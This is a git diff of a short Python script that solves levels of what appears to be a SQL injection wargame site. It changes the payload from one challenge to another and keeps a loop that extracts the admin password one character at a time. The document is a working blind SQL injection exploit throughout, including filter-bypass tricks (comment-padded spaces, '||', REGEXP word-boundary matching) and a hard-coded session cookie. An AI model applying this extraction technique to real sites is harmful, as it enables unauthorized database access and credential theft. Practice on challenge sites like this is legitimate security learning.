@@ -3,13 +3,13 @@ import string
 
 session = requests.Session()
 
-url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw=' || pw like '{}%"
-cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
+url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/pw/**/REGEXP/**/"[[:<:]]{}"'
+cookies = {"PHPSESSID": "lmscmn6uu5q675j19npln84ik4"}
 pw = ""
 for j in range(8):
     for i in string.printable:
         r = requests.get(url.format(pw+i), cookies=cookies)
-        if('Hello admin' in r.text[:200] and i not in "#%&"):
+        if('Hello admin' in r.text[:200] and i not in "#?&"):
             pw += i
             print("Password :", pw)
             break
